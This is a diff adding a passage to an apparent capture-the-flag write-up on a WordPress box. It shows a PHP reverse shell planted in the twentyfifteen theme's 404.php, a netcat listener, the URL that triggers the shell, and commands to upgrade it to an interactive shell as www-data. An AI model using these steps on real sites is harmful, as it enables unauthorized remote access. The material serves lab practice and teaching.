@@ -62,6 +62,28 @@ We can copy the php-reverse-shell.php from https://raw.githubusercontent.com/pen
 
 ![](images/revshell1.png)
 
+Setup a nc listener in our Kali machine
+
+`nc -lvnp 1234`
+
+The path of the **twenty fifteen** theme was /wp-content/themes/twentyfifteen/ in order to execute our reverse shell we must add the 404.php to the path.
+
+`<ip-address>/wp-content/themes/twentyfifteen/404.php`
+
+Now we got a shell. Let's upgrade with the following commands
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+user.txt flag is in /home/c0ldd directory but we don't have permissions as user **www-data**
+
+![](images/failuser.png)
+
+
 
 
 
